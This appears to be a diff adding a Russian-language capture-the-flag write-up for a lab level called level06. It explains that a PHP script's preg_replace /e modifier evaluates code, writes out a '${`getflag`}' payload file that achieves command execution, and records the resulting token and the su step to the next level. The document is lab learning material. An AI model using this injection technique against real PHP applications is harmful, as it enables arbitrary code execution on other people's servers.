@@ -1,0 +1,51 @@
+level06
+
+ls
+В папке 2 файла level06 и level06.php
+
+./level06 выдает ошибку:
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+Вывод: ./level06 комплилился из level06.php, просит файл в качестве параметра
+
+cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) {
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+
+function x($y, $z) {
+	$a = file_get_contents($y);
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+В php-скрипте описывается, какой файл можно подложить в качестве параметра
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+a - имя файла
+#Функция preg_replace() принимает три аргумента 1 - шаблон, 2 - замена шаблона, 3 исходная строка
+#Особенности /e модификатора в том что он выполняет код аргумента замены.
+
+
+google it: http://www.madirish.net/402
+Исходя из этого наша задача состоит в том, чтобы вызвать функцию getflag. 
+Для этого передаем ее в качестве аргумента, не нарушая регулярное выражение.
+Т.е. вместо файла подложим созданный нами файл с getflag:
+echo '[x ${`getflag`}]' > /tmp/getflag
+./level06 /tmp/getflag
+Вывод:
+	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+	in /home/user/level06/level06.php(4) : regexp code on line 1
+
+su level07
+wiok45aaoguiboiki2tuin6ub
+
+Done!
